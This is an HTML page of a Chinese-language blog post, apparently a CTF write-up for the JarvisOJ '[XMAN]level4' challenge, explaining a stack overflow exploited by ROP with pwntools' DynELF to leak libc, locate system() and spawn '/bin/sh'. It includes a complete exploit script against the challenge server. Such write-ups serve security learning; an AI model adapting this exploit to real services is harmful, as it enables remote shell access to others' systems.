@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ROP,栈溢出," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Preface通过泄露内存的方式可以获取目标程序libc中各函数的地址，这种攻击方式可以绕过地址随机化保护。">
+<meta name="keywords" content="ROP,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识ROP Memory Leak &amp; DynELF">
+<meta property="og:url" content="http://mrhong.me/2017/10/25/ROP-DynELF/index.html">
+<meta property="og:site_name" content="mrhong">
+<meta property="og:description" content="Preface通过泄露内存的方式可以获取目标程序libc中各函数的地址，这种攻击方式可以绕过地址随机化保护。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://owxf9km1p.bkt.clouddn.com/20170929_3.png">
+<meta property="og:image" content="http://owxf9km1p.bkt.clouddn.com/20170929_4.png">
+<meta property="og:image" content="http://owxf9km1p.bkt.clouddn.com/20170929_5.png">
+<meta property="og:updated_time" content="2017-10-28T16:29:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初识ROP Memory Leak &amp; DynELF">
+<meta name="twitter:description" content="Preface通过泄露内存的方式可以获取目标程序libc中各函数的地址，这种攻击方式可以绕过地址随机化保护。">
+<meta name="twitter:image" content="http://owxf9km1p.bkt.clouddn.com/20170929_3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://mrhong.me/2017/10/25/ROP-DynELF/"/>
+
+
+
+
+
+  <title>初识ROP Memory Leak & DynELF | mrhong</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrhong</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">萌新一枚，不知自己是谁</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://mrhong.me/2017/10/25/ROP-DynELF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrhong">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">初识ROP Memory Leak & DynELF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-25T23:21:12+08:00">
+                2017-10-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ROP/" itemprop="url" rel="index">
+                    <span itemprop="name">ROP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>通过泄露内存的方式可以获取目标程序<code>libc</code>中各函数的地址，这种攻击方式可以绕过地址随机化保护。<br><a id="more"></a></p>
+<p>记录一下使用DynELF泄露内存的ROP攻击题目<code>[XMAN]level4</code>(JarvisOJ)。</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>read</code>函数很显然有一个栈溢出漏洞，通过<code>checksec</code>发现存在地址随机化<code>ASLR</code>，每次程序时地址随机。</p>
+<p>但是程序运行的时候<code>libc</code>已经载入到内存中了，这时<code>libc</code>的地址是一个固定的值，我们可以通过泄露内存的方法<code>dump</code>出程序正在使用的<code>libc</code>，从而找到<code>libc</code>中<code>system</code>函数的地址。</p>
+<p>题目并没有给<code>libc</code>文件，故利用DynELF来leak<code>system</code>的地址。</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>首先构建泄露<code>system</code>地址的payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+<p><code>ret</code>执行后，栈为：</p>
+<p><img src="http://owxf9km1p.bkt.clouddn.com/20170929_3.png" alt="20170929_3"></p>
+<p>构造<code>leak</code>函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  data = sh.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x %s"</span> % (address, data)</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+<p>从而获得<code>system</code>地址，从而构造<code>system(&quot;/bin/sh&quot;)</code>完成攻击。但是程序中并没有<code>system(&quot;/bin/sh&quot;)</code>，可以构造一个<code>read</code>函数将其写入一个固定的位置，然后完成<code>system</code>调用，思路如下：</p>
+<p>将<code>/bin/sh</code>写入固定位置的bss段内，payload1如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(read_plt) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(main_addr) + p32(bss_addr)</span><br></pre></td></tr></table></figure>
+<p><img src="http://owxf9km1p.bkt.clouddn.com/20170929_4.png" alt="20170929_4"></p>
+<p>我们构造的<code>read</code>函数有3个<code>参数</code>，这3个<code>参数</code>和read函数的<code>返回地址</code>不同，返回地址在ret指令执行时被<code>pop</code>出栈，但是这3个参数却还<strong>留在栈</strong>中，没有被弹出栈，这回影响我们构造的下一个函数<code>system</code>的执行，所以我们需要找一个连续<strong>pop三个寄存器</strong>的指令来平衡堆栈。</p>
+<p>可以使用<code>ROPgadget</code>：</p>
+<p><img src="http://owxf9km1p.bkt.clouddn.com/20170929_5.png" alt="20170929_5"></p>
+<p>找到可利用的<code>0x08048509</code></p>
+<p>使用<code>DynELF</code>模块查找<code>system</code>函数地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">  system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process("./level4")</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9880</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#got&amp;plt</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr</span></span><br><span class="line">main_addr = <span class="number">0x08048470</span></span><br><span class="line">bss_addr  = elf.bss() <span class="comment">#e.symbols['__bss_start']</span></span><br><span class="line">pop3ret = <span class="number">0x08048509</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">  payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  data = sh.recv(<span class="number">4</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"%#x %s"</span> % (address, data)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="comment">#leak</span></span><br><span class="line">  d = DynELF(leak, elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">  system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br><span class="line">  </span><br><span class="line">  payload1 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(read_plt) + p32(pop3ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#system('/bin/sh')</span></span><br><span class="line">  sh.send(payload1)</span><br><span class="line">  sh.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">  sh.interactive()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ROP/" rel="tag"># ROP</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/28/2015-32C3CTF-smashes/" rel="prev" title="2015-32C3CTF-smashes">
+                2015-32C3CTF-smashes <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description">探索那万千世界</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preface"><span class="nav-number">1.</span> <span class="nav-text">Preface</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">4.</span> <span class="nav-text">EXP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
